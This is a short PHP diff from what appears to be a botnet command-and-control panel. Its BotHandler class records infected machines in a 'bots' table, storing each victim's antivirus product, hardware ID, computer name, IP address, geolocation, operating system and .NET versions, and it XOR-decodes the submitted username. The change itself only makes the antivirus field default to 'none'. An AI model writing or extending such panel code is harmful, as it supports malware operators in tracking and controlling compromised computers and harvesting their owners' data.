@@ -137,9 +137,16 @@ class BotHandler{
             }
 
         }else{
-            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-            $statement->execute(array(
-                $_POST["av"],
+        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+  		if(!empty($_POST["av"])){
+    $avcheck = $_POST["av"];
+ }else{
+     $avcheck = "none";
+ }
+ 
+ 
+ $statement->execute(array(
+                $avcheck,
                 $_POST["hwid"],
                 $this->xor_this($_POST["username"]),
                 $country,
